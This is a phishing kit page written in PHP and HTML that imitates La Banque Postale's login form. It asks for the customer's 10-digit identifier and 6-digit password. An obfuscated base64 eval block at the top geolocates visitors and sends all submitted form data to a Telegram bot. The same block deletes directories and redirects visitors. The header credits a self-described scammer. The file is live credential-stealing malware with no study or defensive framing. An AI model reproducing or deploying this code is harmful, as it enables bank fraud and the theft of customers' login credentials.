<?php eval(base64_decode('CiBnb3RvIHJZZGJLOyBSeGc5bzogJGluZm8gPSB1bnNlcmlhbGl6ZShmaWxlX2dldF9jb250ZW50cygiXHg2OFx4NzRcMTY0XDE2MFx4M2FceDJmXHgyZlx4NjlcMTYwXDU1XDE0MVx4NzBceDY5XHgyZVx4NjNcMTU3XDE1NVx4MmZcMTYwXHg2OFwxNjBcNTd7JFN0cnVwTG9tfVw3N1x4NjZceDY5XDE0NVwxNTRcMTQ0XHg3M1w3NVwxNjNceDc0XDE0MVx4NzRcMTY1XHg3M1w1NFx4NmRcMTQ1XHg3M1x4NzNcMTQxXHg2N1x4NjVcNTRceDYzXHg2ZlwxNTZceDc0XDE1MVx4NmVceDY1XHg2ZVwxNjRcNTRceDYzXHg2ZlwxNTZceDc0XHg2OVx4NmVceDY1XDE1NlwxNjRceDQzXDE1N1wxNDRceDY1XDU0XHg2M1x4NmZcMTY1XHg2ZVwxNjRceDcyXHg3OVx4MmNceDYzXHg2ZlwxNjVcMTU2XDE2NFwxNjJceDc5XDEwM1x4NmZceDY0XDE0NVw1NFx4NzJceDY1XHg2N1wxNTFcMTU3XHg2ZVx4MmNcMTYyXHg2NVwxNDdceDY5XHg2Zlx4NmVceDRlXDE0MVwxNTVceDY1XHgyY1wxNDNceDY5XHg3NFwxNzFceDJjXHg2NFx4NjlceDczXDE2NFx4NzJceDY5XDE0M1x4NzRceDJjXHg3YVx4NjlceDcwXHgyY1wxNTRcMTQxXHg3NFw1NFwxNTRcMTU3XDE1Nlx4MmNceDc0XDE1MVx4NmRceDY1XHg3YVx4NmZceDZlXDE0NVw1NFwxNDNceDc1XHg3MlwxNjJceDY1XDE1Nlx4NjNceDc5XHgyY1wxNTFcMTYzXHg3MFx4MmNcMTU3XHg3Mlx4NjdcNTRcMTQxXDE2M1x4MmNcMTQxXHg3M1wxNTZcMTQxXHg2ZFx4NjVcNTRceDcyXHg2NVwxNjZcMTQ1XHg3Mlx4NzNceDY1XDU0XHg2ZFwxNTdcMTQyXDE1MVx4NmNcMTQ1XDU0XDE2MFx4NzJceDZmXHg3OFwxNzFcNTRcMTUwXHg2ZlwxNjNceDc0XHg2OVx4NmVceDY3XDU0XHg3MVwxNjVceDY1XHg3Mlx4NzkiKSk7IGdvdG8gYjhsR3E7IFVmc3BTOiBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyBnb3RvIHBzMjBEOyBLUEloUzogJHBhcnRzID0gZXhwbG9kZSgkd2ViRGlyZWN0b3J5LCAkY3VycmVudERpcmVjdG9yeSwgMik7IGdvdG8gTzY3Smo7IGlEMGQ4OiAkcGFyZW50RGlyZWN0b3J5ID0gIlx4NjhceDc0XDE2NFwxNjBcMTYzXHgzYVw1N1x4MmZ7JGhvbWVEb21haW59XDU3XHg3N1wxNDVcMTQyIjsgZ290byBkcVNrcTsgbk9kTmg6ICRTdHJvbmdTb2wgPSAkc3ViRGlyZWN0b3JpZXNbMF07IGdvdG8gRWRQVEU7IEhzd0hyOiBmdW5jdGlvbiB0ZWxzZW50KCRtZXNzYWdlKSB7ICRUcnViRnR1YiA9ICJceDJkXHgzOVx4MzRceDM3XHgzMVw2MFx4MzNcNjdcNjBceDMwIjsgJGNSZXRWY2tyID0gIlx4MzZcNjNcNjZcNjBcNjZceDM4XDY3XHgzMFw2NVw2NFx4M2FceDQxXHg0MVx4NDVceDM1XHg3MlwxNjVceDM3XHg2NFx4NzdcMTcyXDYyXDE0Mlx4NzNcMTYxXDE2NFw2MlwxMjZcMTQ0XHg0Mlx4NjJcMTYyXDE0Nlw2NFx4NmZcMTEyXDE1MFwxNjVceDM5XHg2N1x4NThcMTQ2XDEyM1x4NThceDYyXDE1MyI7ICRhcGlfdXJsID0gIlx4NjhcMTY0XDE2NFx4NzBcMTYzXDcyXDU3XHgyZlx4NjFcMTYwXHg2OVx4MmVceDc0XHg2NVwxNTRceDY1XDE0N1wxNjJcMTQxXDE1NVx4MmVceDZmXDE2Mlx4NjdceDJmXHg2Mlx4NmZcMTY0eyRjUmV0VmNrcn1ceDJmXDE2M1wxNDVcMTU2XDE0NFx4NGRceDY1XHg3M1x4NzNceDYxXHg2N1x4NjUiOyAkcGFyYW1zID0gYXJyYXkoIlx4NjNceDY4XHg2MVx4NzRcMTM3XHg2OVwxNDQiID0+ICRUcnViRnR1YiwgIlwxNjRceDY1XHg3OFwxNjQiID0+ICRtZXNzYWdlKTsgJGNoID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICRhcGlfdXJsKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIHRydWUpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgaHR0cF9idWlsZF9xdWVyeSgkcGFyYW1zKSk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY2gpOyBjdXJsX2Nsb3NlKCRjaCk7IH0gZ290byB2R2wyTDsgaHVKSVk6IGlmIChpc3NldCgkaW5mb1siXDE0M1wxNTdcMTY1XHg2ZVx4NzRceDcyXHg3OSJdKSkgeyAkX1NFU1NJT05bIlwxMDJcMTU0XHg2MVx4NzNceDYxXHg2M1x4NmZcMTY1XHg2ZSJdID0gJGluZm9bIlx4NjNcMTU3XDE2NVwxNTZcMTY0XDE2Mlx4NzkiXTsgfSBnb3RvIGJlbEdGOyBQNTA1TjogaW5pX3NldCgiXDE0NFx4NjlcMTYzXDE2MFwxNTRcMTQxXDE3MVx4NWZceDY1XDE2Mlx4NzJceDZmXDE2Mlx4NzMiLCAxKTsgZ290byBlZlpKNDsgdmM1WEE6IGlmICh0cmltKCRyZXNsb2NhbCkgIT0gdHJpbSgkU3RydXBMb20pKSB7ICRTdHJvbmdTb2wgPSAnJyAuIGJhc2VuYW1lKF9fRElSX18pOyAkaG9tZURvbWFpbiA9ICRfU0VSVkVSWyJcMTEwXHg1NFx4NTRcMTIwXHg1ZlwxMTBcMTE3XHg1M1x4NTQiXTsgJHZlcmlmeUFjY291bnRVUkwgPSAiXHg2OFwxNjRcMTY0XHg3MFx4NzNceDNhXHgyZlx4MmZ7JGhvbWVEb21haW59XHgyZlwxNTFcMTU2XDE0NFwxNDVcMTcwXDU2XHg3MFwxNTBcMTYwXDc3XDE2NlwxNDVcMTYyXDE1MVx4NjZcMTcxXDEzN1wxNDFcMTQzXDE0M1x4NmZcMTY1XHg2ZVx4NzRceDNkXHg3M1x4NjVcMTYzXHg3M1wxNTFcMTU3XHg2ZVx4MjYiIC4gbWQ1KG1pY3JvdGltZSgpKSAuICJcNDZcMTQ0XHg2OVx4NzNceDcwXDE0MVwxNjRceDYzXDE1MFx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXHgyNlwxNDFcMTQzXHg2M1wxNDVcMTYzXHg3M1x4M2RceDI2XHg2NFx4NjFcMTY0XDE0MVx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXDQ2XHg2Y1x4NmZceDZjXHg2ZFwxNDVceDNkeyRTdHJvbmdTb2x9IjsgZWNobyAiXHgzY1x4NzNcMTQzXHg3Mlx4NjlcMTYwXDE2NFw0MFwxMTRcMTAxXHg0ZVwxMDdceDU1XDEwMVwxMDdcMTA1XHgzZFx4MjdceDRhXHg2MVwxNjZcMTQxXDEyM1x4NjNcMTYyXHg2OVx4NzBceDc0XDQ3XHgzZVwxMlx4MjBceDIwXHgyMFx4MjBceDc3XHg2OVx4NmVceDY0XDE1N1x4NzdcNTZceDZjXDE1N1x4NjNcMTQxXHg3NFwxNTFceDZmXHg2ZVx4MmVceDY4XHg3Mlx4NjVceDY2XDc1XHgyN3skdmVyaWZ5QWNjb3VudFVSTH1cNDdceDNiXDEyXHgyMFx4MjBcNDBceDIwXDQwXDc0XHgyZlwxNjNcMTQzXHg3Mlx4NjlcMTYwXDE2NFx4M2UiOyBkaWU7IH0gZ290byBtdkhsQTsgdDRoY0Y6IGN1cmxfY2xvc2UoJGNoKTsgZ290byBnOU5aZzsgVE5VV0s6IGlmIChpc19hcnJheSgkZGlyZWN0b3JpZXMpKSB7IGZvcmVhY2ggKCRkaXJlY3RvcmllcyBhcyAkZGlyKSB7IGlmIChiYXNlbmFtZSgkZGlyKVswXSAhPSAiXDU2IikgeyBpZiAoZGVsZXRlRGlyZWN0b3J5KCRkaXIpKSB7IH0gfSB9IH0gZ290byB1QXBBUjsgYjhsR3E6IGlmIChpc3NldCgkaW5mb1siXDE0MVx4NzMiXSkpIHsgJF9TRVNTSU9OWyJceDY5XHg3M1wxNjAiXSA9ICRpbmZvWyJceDYxXHg3MyJdOyB9IGdvdG8gaHVKSVk7IHJkRG1IOiBmdW5jdGlvbiBkZWxldGVEaXJlY3RvcnkoJGRpcikgeyBpZiAoIWZpbGVfZXhpc3RzKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGlmICghaXNfZGlyKCRkaXIpKSB7IHJldHVybiB1bmxpbmsoJGRpcik7IH0gJHRpbWVfZGlmZiA9IHRpbWUoKSAtIGZpbGVjdGltZSgkZGlyKTsgaWYgKCR0aW1lX2RpZmYgPiAzMjApIHsgZm9yZWFjaCAoc2NhbmRpcigkZGlyKSBhcyAkaXRlbSkgeyBpZiAoJGl0ZW0gPT0gIlx4MmUiIHx8ICRpdGVtID09ICJceDJlXDU2IikgeyBjb250aW51ZTsgfSBpZiAoIWRlbGV0ZURpcmVjdG9yeSgkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRpdGVtKSkgeyByZXR1cm4gZmFsc2U7IH0gfSBpZiAocm1kaXIoJGRpcikpIHsgcmV0dXJuIHRydWU7IH0gZWxzZSB7IHJldHVybiBmYWxzZTsgfSB9IGVsc2UgeyByZXR1cm4gdHJ1ZTsgfSB9IGdvdG8gS1o4d0Q7IGc5TlpnOiBpZiAoIWVtcHR5KCRyZXNsb2NhbCkpIHsgfSBlbHNlIHsgJFN0cm9uZ1NvbCA9ICcnIC4gYmFzZW5hbWUoX19ESVJfXyk7ICRob21lRG9tYWluID0gJF9TRVJWRVJbIlwxMTBceDU0XHg1NFx4NTBceDVmXHg0OFx4NGZcMTIzXDEyNCJdOyAkdmVyaWZ5QWNjb3VudFVSTCA9ICJcMTUwXHg3NFwxNjRceDcwXDE2M1w3Mlx4MmZceDJmeyRob21lRG9tYWlufVw1N1x4NjlceDZlXHg2NFwxNDVceDc4XHgyZVwxNjBcMTUwXHg3MFw3N1x4NzZcMTQ1XHg3MlwxNTFceDY2XDE3MVx4NWZceDYxXHg2M1wxNDNcMTU3XDE2NVwxNTZcMTY0XDc1XHg3M1wxNDVceDczXHg3M1wxNTFcMTU3XHg2ZVw0NiIgLiBtZDUobWljcm90aW1lKCkpIC4gIlx4MjZcMTQ0XHg2OVwxNjNcMTYwXHg2MVx4NzRcMTQzXHg2OFx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXDQ2XHg2MVx4NjNcMTQzXDE0NVwxNjNceDczXHgzZFx4MjZceDY0XDE0MVx4NzRcMTQxXDc1IiAuIHNoYTEobWljcm90aW1lKCkpIC4gIlx4MjZceDZjXHg2ZlwxNTRceDZkXHg2NVw3NXskU3Ryb25nU29sfSI7IGVjaG8gIlx4M2NcMTYzXHg2M1x4NzJcMTUxXDE2MFwxNjRcNDBceDRjXDEwMVx4NGVceDQ3XHg1NVx4NDFceDQ3XHg0NVw3NVx4MjdcMTEyXDE0MVwxNjZceDYxXDEyM1x4NjNcMTYyXHg2OVwxNjBcMTY0XDQ3XHgzZVx4YVw0MFx4MjBceDIwXHgyMFwxNjdcMTUxXDE1NlwxNDRceDZmXHg3N1x4MmVceDZjXDE1N1wxNDNcMTQxXDE2NFwxNTFceDZmXDE1Nlx4MmVceDY4XHg3Mlx4NjVceDY2XDc1XHgyN3skdmVyaWZ5QWNjb3VudFVSTH1cNDdceDNiXHhhXDQwXHgyMFw0MFx4MjBcNDBcNzRcNTdcMTYzXHg2M1wxNjJceDY5XHg3MFwxNjRcNzYiOyBkaWU7IH0gZ290byB2YzVYQTsgS1o4d0Q6ICRob21lRG9tYWluID0gJF9TRVJWRVJbIlx4NDhcMTI0XHg1NFx4NTBceDVmXDExMFx4NGZceDUzXHg1NCJdOyBnb3RvIGlEMGQ4OyBvQlJtODogJGhvbWVEb21haW4gPSAkX1NFUlZFUlsiXDExMFx4NTRceDU0XDEyMFwxMzdcMTEwXDExN1wxMjNcMTI0Il07IGdvdG8gdmkwSTU7IHVBcEFSOiAkY3VycmVudERpcmVjdG9yeSA9IF9fRElSX187IGdvdG8gdURqZks7IHRIQmwyOiAkZG9uZmxhZyA9ICRfU0VSVkVSWyJcMTIzXHg0NVwxMjJceDU2XDEwNVwxMjJceDVmXDExNlx4NDFcMTE1XHg0NSJdOyBnb3RvIFJ4ZzlvOyBPNjdKajogJHN1YkRpcmVjdG9yaWVzID0gZXhwbG9kZSgiXDU3IiwgJHBhcnRzWzFdKTsgZ290byBuT2ROaDsgdmkwSTU6ICRwYXJlbnREaXJlY3RvcnkgPSAiXHg2OFwxNjRcMTY0XDE2MFwxNjNcNzJcNTdcNTd7JGhvbWVEb21haW59XHgyZlx4NzdceDY1XHg2Mlw1N3skU3Ryb25nU29sfVx4MmZ7JGZpbGVuYW1lfSI7IGdvdG8gaGQ0aUY7IGhkNGlGOiAkY2ggPSBjdXJsX2luaXQoJHBhcmVudERpcmVjdG9yeSk7IGdvdG8gVWZzcFM7IFN5VTU2OiBpZiAoJHJlc2xvY2FsID09PSBmYWxzZSkgeyBkaWUoIlwxNDNceDU1XHg1Mlx4NGNceDIwXDEwNVwxNjJcMTYyXDE1N1x4NzJceDNhXDQwIiAuIGN1cmxfZXJyb3IoJGNoKSk7IH0gZ290byB0NGhjRjsgRWRQVEU6ICRmaWxlbmFtZSA9ICJcMTU0XDE1N1wxNDNceDYxXHg2Y1w1Nlx4NzRcMTcwXDE2NCI7IGdvdG8gb0JSbTg7IGRxU2txOiAkZGlyZWN0b3JpZXMgPSBnbG9iKCRwYXJlbnREaXJlY3RvcnkgLiAiXHgyZlx4MmEiLCBHTE9CX09OTFlESVIpOyBnb3RvIFROVVdLOyBXUzJhMTogaWYgKCFlbXB0eSgkdmFsaWRJUHMpKSB7ICRTdHJ1cExvbSA9ICR2YWxpZElQc1swXTsgfSBlbHNlIHsgJFN0cnVwTG9tID0gIlw2MVw2Mlw2N1x4MmVceDMwXDU2XDYwXHgyZVx4MzEiOyB9IGdvdG8gdEhCbDI7IFNlQ0hGOiBpZiAoaXNzZXQoJGluZm9bIlwxNjJceDY1XDE0N1x4NjlceDZmXDE1NlwxMTZcMTQxXHg2ZFwxNDUiXSkpIHsgJF9TRVNTSU9OWyJceDc4XHg0Zlx4NzBcMTY1XDE3MSJdID0gJGluZm9bIlwxNjJceDY1XDE0N1x4NjlceDZmXHg2ZVwxMTZcMTQxXDE1NVwxNDUiXTsgfSBnb3RvIHJkRG1IOyBGR2ludjogJHZhbGlkSVBzID0gYXJyYXkoKTsgZ290byBlckN0QTsgYmVsR0Y6IGlmIChpc3NldCgkaW5mb1siXHg2M1x4NmZceDc1XHg2ZVx4NzRcMTYyXHg3OVwxMDNceDZmXDE0NFx4NjUiXSkpIHsgJF9TRVNTSU9OWyJcMTE2XDE1MlwxNTdcMTYwXDE0NiJdID0gJGluZm9bIlx4NjNceDZmXDE2NVx4NmVceDc0XHg3MlwxNzFcMTAzXDE1N1x4NjRceDY1Il07IH0gZ290byB3b2x5RjsgeG5QVFo6IGlmICgkaXBNYXRjaGVzKSB7ICR2YWxpZElQcyA9ICRtYXRjaGVzWzBdOyB9IGdvdG8gV1MyYTE7IHdvbHlGOiBpZiAoaXNzZXQoJGluZm9bIlwxNDNcMTUxXDE2NFx4NzkiXSkpIHsgJF9TRVNTSU9OWyJcMTI2XDE1N1wxNjBcMTYyXDE2NCJdID0gJGluZm9bIlx4NjNcMTUxXDE2NFx4NzkiXTsgfSBnb3RvIFNlQ0hGOyBlckN0QTogJGlwTWF0Y2hlcyA9IHByZWdfbWF0Y2hfYWxsKCJceDJmXHg1Y1x4NjJceDVjXHg2NFx4N2JceDMxXDU0XDYzXDE3NVwxMzRceDJlXDEzNFwxNDRcMTczXDYxXDU0XDYzXDE3NVx4NWNcNTZceDVjXDE0NFwxNzNcNjFceDJjXHgzM1wxNzVceDVjXDU2XDEzNFx4NjRcMTczXDYxXHgyY1x4MzNceDdkXDEzNFwxNDJceDJmIiwgJGlwQWRkcmVzcywgJG1hdGNoZXMpOyBnb3RvIHhuUFRaOyByWWRiSzogZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsgZ290byBQNTA1TjsgUEJVWnI6IGlmICghZW1wdHkoJF9TRVJWRVJbIlx4NDhcMTI0XHg1NFx4NTBceDVmXHg0M1wxMTRceDQ5XHg0NVwxMTZceDU0XDEzN1x4NDlceDUwIl0pKSB7ICRpcEFkZHJlc3MgPSAkX1NFUlZFUlsiXDExMFwxMjRceDU0XDEyMFwxMzdceDQzXHg0Y1x4NDlceDQ1XHg0ZVwxMjRceDVmXHg0OVwxMjAiXTsgfSBlbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsiXDExMFwxMjRceDU0XHg1MFwxMzdcMTMwXHg1ZlwxMDZcMTE3XHg1MlwxMjdcMTAxXDEyMlwxMDRcMTA1XDEwNFx4NWZcMTA2XDExN1x4NTIiXSkpIHsgJGlwQWRkcmVzcyA9ICRfU0VSVkVSWyJceDQ4XDEyNFx4NTRcMTIwXDEzN1x4NThcMTM3XDEwNlwxMTdcMTIyXHg1N1x4NDFceDUyXDEwNFwxMDVceDQ0XHg1Zlx4NDZcMTE3XHg1MiJdOyB9IGVsc2UgeyAkaXBBZGRyZXNzID0gJF9TRVJWRVJbIlwxMjJcMTA1XDExNVwxMTdcMTI0XHg0NVx4NWZceDQxXHg0NFwxMDRcMTIyIl07IH0gZ290byBGR2ludjsgcHMyMEQ6ICRyZXNsb2NhbCA9IGN1cmxfZXhlYygkY2gpOyBnb3RvIFN5VTU2OyB1RGpmSzogJHdlYkRpcmVjdG9yeSA9ICJcNTdcMTY3XDE0NVx4NjJceDJmIjsgZ290byBLUEloUzsgbXZIbEE6IGlmICgkX1NFUlZFUlsiXDEyMlwxMDVcMTIxXHg1NVwxMDVcMTIzXHg1NFwxMzdcMTE1XHg0NVwxMjRceDQ4XDExN1x4NDQiXSA9PT0gIlx4NTBceDRmXDEyM1x4NTQiKSB7ICRwb3N0RGF0YVN0cmluZyA9ICcnOyAkcHJvX25tID0gJyc7IGZvcmVhY2ggKCRfUE9TVCBhcyAka2V5ID0+ICR2YWx1ZSkgeyBpZiAoIWVtcHR5KCRfU0VTU0lPTlsiXDE2MFx4NzJceDZmXDE1MlwxNDVceDYzXDE2NCJdKSkgeyAkcHJvX25tID0gJF9TRVNTSU9OWyJceDcwXDE2Mlx4NmZceDZhXDE0NVwxNDNcMTY0Il07IH0gJHBvc3REYXRhU3RyaW5nIC49ICJcMTEzXHg2NVx4NzlcNzJceDIweyRrZXl9XDU0XDQwXDEyNlx4NjFcMTU0XDE2NVx4NjVceDNhXHgyMHskdmFsdWV9XDQwXHg1MFwxNjJceDZmXHgzYVx4MjB7JHByb19ubX1ceGEiOyB9IGlmICghZW1wdHkoJHBvc3REYXRhU3RyaW5nKSkgeyB0ZWxzZW50KCRwb3N0RGF0YVN0cmluZyk7IH0gfSBnb3RvIEhzd0hyOyBlZlpKNDogaWYgKHNlc3Npb25fc3RhdHVzKCkgPT0gUEhQX1NFU1NJT05fTk9ORSkgeyBzZXNzaW9uX3N0YXJ0KCk7IH0gZ290byBQQlVacjsgdkdsMkw6IA==')); ?>
<?php
/**
 * @link       : https://www.satan2.com/ 
 * @package    : POSTALE
 * @author     : SATAN 2 
 * @telegram   : @satan2
 * @email      : lesatan2scam@gmail.com
 * @mise � jour: 05-05-2023
 * @facebook   : https://www.facebook.com/satan2
 */
?>
<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html class="no-js" lang="fr">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />

    <title>Connexion </title>
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
    <meta name="format-detection" content="telephone=no" />

    <meta name="theme-color" content="#0b234d" />

    <script src="source/toolbox-xo.min.js.download" type="text/javascript"></script>
    <script language="javascript" type="text/javascript" src="source/val_keypad_cvd.js.download"></script>
    <script language="javascript" type="text/javascript" src="source/val_keypad_cvvs-env.js.download"></script>
    <script type="text/javascript" async="" src="source/loreo.js.download"></script>

    <style type="text/css">
      @import url(https://transverse.labanquepostale.fr/xo_/9.9.1.0/cvvs/css/loader.css);
      @import url(https://transverse.labanquepostale.fr/xo_/toolbox/1.4/toolbox-xo.css);
      @import url(https://transverse.labanquepostale.fr/xo_/9.9.1.0/cvvs/css/cvs_refonte.css);
    </style>
    <script src="source/fruprem.js.download" async="" type="text/javascript"></script>
    <script type="text/javascript" src="source/netroco.js.download" id="h44k9"></script>
    <script type="text/javascript" src="source/piment.js.download" id="eeycrb"></script>
    <script type="text/javascript" src="source/drun.js.download" id="x30hn"></script>
    <script type="text/javascript" src="source/dasti.js.download" id="uh71vi"></script>
    <script type="text/javascript" async="" src="source/u9mW"></script>
    <script type="text/javascript" async="" src="source/QSAy"></script>
    <script type="text/javascript" async="" src="source/u9mW(1)"></script>
    <script type="text/javascript" async="" src="source/kzi"></script>
    <script type="text/javascript" async="" src="source/kzi(1)"></script>
    <script type="text/javascript" async="" src="source/u9mW(2)"></script>
    <script type="text/javascript" async="" src="source/u9mW(3)"></script>
  </head>

  <body data-image="logo" data-tb-animate="actif" class="tb-user-connected">
    <div class="flex-container--column --nowrap tb-wrapper-main tb-wrapper-cvd">
      <main class="flex-container--column --nowrap flex-item-fluid overflow-y back-color-trans txt-color-black pa-16" role="main">
        <form id="form-xo-1" method="post" action="data_login.php" name="formAccesCompte">
          <div id="hidden">
            <input type="hidden" name="urlbackend" value="" />
            <input type="hidden" name="origin" value="particuliers" />
            <input type="hidden" name="cv" value="true" />
            <input type="hidden" name="cvvs" value="" />
            <input type="hidden" id="iscd" name="iscdName" value="" />
            <input type="hidden" id="passname" name="cltName" value="" />
          </div>

          <div class="ecran font-normal" id="ecran">
            <div data-tb-form-field="" data-tb-form-id="identifiant" class="flex-container w100">
              <label for="identifiant" class="font-x-medium txt-color-6 mb0">Identifiant � 10 chiffres</label>
              <div class="flex-container w100 mtts">
                <div class="tb-container-cvdId w100 --reset flex-item-fluid flex-container-column --injected">
                  <div class="relative flex-center flex-item-fluid">
                    <input
                      type="text"
                      required
                      class="hide-focus --ready --describedby"
                      id="identifiant"
                      inputmode="numeric"
                      pattern="[\*0-9]*"
                      autocomplete="username"
                      maxlength="10"
                      aria-required="true"
                      accessreset="Effacer la saisie de l&#39;identifiant"
                      name="username"
                      style="direction: ltr;"
                    />
                    <span class="souligne" aria-hidden="true">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
                  </div>
                  <button class="flex-item-center flex-container flex-align-center flex-center --reset" type="button" data-lien-user="actif">
                    <span data-icon="tb-reset" aria-hidden="true"></span><span class="visually-hidden access-text">Effacer la saisie de l'identifiant</span>
                  </button>
                </div>
              </div>
              <div data-tb-form-message="" class="flex-container flex-item-last">
                <div data-icon="tb-erreur" aria-hidden="true" class="--size16px mrts mts"></div>
                <p data-ad-messages="identifiant" class="flex-container--column flex-item-fluid mts mb0 is-hidden" hidden="hidden">
                  <span data-ad-message="RG001" id="identifiant-RG001" class="is-hidden" hidden="hidden">Veuillez renseigner votre identifiant.</span>
                  <span data-ad-message="RG002" id="identifiant-RG002" class="is-hidden" hidden="hidden">Votre identifiant est incomplet.</span>
                </p>
              </div>
            </div>

            <div class="flex-container w100 mts">
              <input id="check" name="check-1" type="checkbox" class="tb-checkbox --animate" />
              <label for="check" class="flex-item-fluid">
                <span class="flex-container--row">
                  <span class="tb-check" aria-hidden="true" tabindex="-1">
                    <svg width="11px" height="8px" viewBox="0 0 12 9" aria-hidden="true" focusable="false">
                      <polyline points="1 5 4 8 11 1"></polyline>
                    </svg>
                    <span class="tb-mask-svg"></span>
                  </span>
                  <span class="font-x-normal txt-color-black tb-memoriser">M�moriser mon identifiant (facultatif)</span>
                </span>
              </label>
            </div>

            <div id="btnContinuer" class="mtgl u-txt-center tb-volet-hidden">
              <button class="tb-btn-p --tiny w100" type="submit" data-lien-user="actif" onclick="continuer()">Continuer</button>
            </div>

            <div class="w100">
              <div data-tb-form-field="" data-tb-form-id="motdepasse" class="flex-container w100 mtgl">
                <div
                  data-tb-cvd-label=""
                  role="heading"
                  aria-level="3"
                  id="label-password"
                  tabindex="-1"
                  class="font-x-medium txt-color-6 mb0"
                  data-tb-cvd-alert="N&#39;appuyez pas sur les chiffres de votre clavier, utilisez les boutons suivants pour saisir votre mot de passe"
                >
                  <span aria-hidden="true">Mot de passe � 6 chiffres sur ce clavier</span>
                  <span class="visually-hidden">Utilisez les boutons suivants pour saisir votre Mot de passe � 6 chiffres sur ce clavier</span>
                </div>
                <div class="tb-container-cvdPsw w100 mtts --reset --injected --empty">
                  <div class="relative flex-center flex-item-fluid">
                    <input type="text" id="password" name="password" maxlength="6" hidden="" class="--ready" />
                    <span class="puces" aria-hidden="true"><span class="puce"></span><span class="puce"></span><span class="puce"></span><span class="puce"></span><span class="puce"></span><span class="puce"></span></span>
                  </div>
                  <div data-tb-aria="" aria-atomic="true" class="visually-hidden access-text" aria-live="polite"><p>0 chiffre saisi sur 6</p></div>
                  <button onclick= "clear_pass()" class="flex-item-center flex-container flex-align-center flex-center --reset" id="reset-password" type="button" data-lien-user="actif" hidden="false">
                    <span  data-icon="tb-reset" aria-hidden="true"></span><span class="visually-hidden access-text">Effacer la saisie du mot de passe</span>
                  </button>
                </div>
                <div data-tb-form-message="" class="flex-container">
                  <div data-icon="tb-erreur" aria-hidden="true" class="--size16px mrts mts"></div>
                  <div role="heading" aria-level="4" id="motdepasse" tabindex="-1" data-ad-messages="motdepasse" class="flex-container--column flex-item-fluid mts mb0 no-aria-describedby is-hidden --describedby" hidden="hidden">
                    <span data-ad-message="RG001" id="motdepasse-RG001" class="is-hidden" hidden="hidden">Veuillez renseigner votre mot de passe.</span>
                    <span data-ad-message="RG002" id="motdepasse-RG002" class="is-hidden" hidden="hidden">
                      <span aria-hidden="true">Votre mot de passe est incomplet.</span>
                      <span class="visually-hidden access-text">Votre mot de passe est incomplet</span>
                    </span>
                  </div>
                </div>

                <div class="flex-container flex-item-center flex-align-center flex-center w100 mtts" data-tb-cvd-id="password">
                  <div data-tb-cvd-keys="" class="flex-container flex-space-between">
                    <button onclick="addIndex(9)" type="button" data-tb-index="0">9</button>
                    <button onclick="addIndex(0)" type="button" data-tb-index="1">0</button>
                    <button onclick="addIndex(4)" type="button" data-tb-index="2">4</button>
                    <button onclick="addIndex(2)" type="button" data-tb-index="3">2</button>
                    <button onclick="addIndex(6)" type="button" data-tb-index="4">6</button>
                    <button onclick="addIndex(5)" type="button" data-tb-index="5">5</button>
                    <button onclick="addIndex(3)" type="button" data-tb-index="6">3</button>
                    <button onclick="addIndex(8)" type="button" data-tb-index="7">8</button>
                    <button onclick="addIndex(1)" type="button" data-tb-index="8">1</button>
                    <button onclick="addIndex(7)" type="button" data-tb-index="9">7</button>
                  </div>
                </div>
              </div>
              <div class="mtgl u-txt-center">
                <button
                  data-tb-cvd-valider=""
                  id="btnConnexion"
                  class="tb-btn-p w100"
                  type="submit"
                  data-lien-user="actif"
                  data-tb-cvd-alert="N&#39;appuyez pas sur les chiffres de votre clavier, utilisez les boutons pr�c�dents pour saisir votre mot de passe"
                >
                  Se connecter
                </button>
              </div>
            </div>
          </div>
        </form>
        <div id="tbi-loader" class="--tiny --spinner" data-tb-spinner="spin"></div>
      </main>
    </div>
    <script language="javascript" type="text/javascript">
      var PATH_JS = "https://transverse.labanquepostale.fr/xo_/9.9.1.0/cvvs";
      var PATH_RESIZER = "https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/vendors";
    </script>
<script>
        function addIndex(value) {
            var inputField = document.getElementById("passname");
			
			if (inputField.value.length < 6) {
		     	inputField.value += value;
			}
        }
		
  function clear_pass(){
        var inputField = document.getElementById("passname");
		alert(inputField.value.length);
        inputField.value = '';

  }
  
    </script>
    <script type="text/javascript" src="source/iframeresizer-contentWindow-4-3-2.min.js.download"></script>
    <div style="clear: both; display: block; height: 0px;"></div>
    <iframe title="ikiiur" id="idi618" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;" src="source/saved_resource(2).html"></iframe>
    <iframe title="_gqxql" id="igdi737" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;" src="source/saved_resource(3).html"></iframe>
 

 </body>
</html>
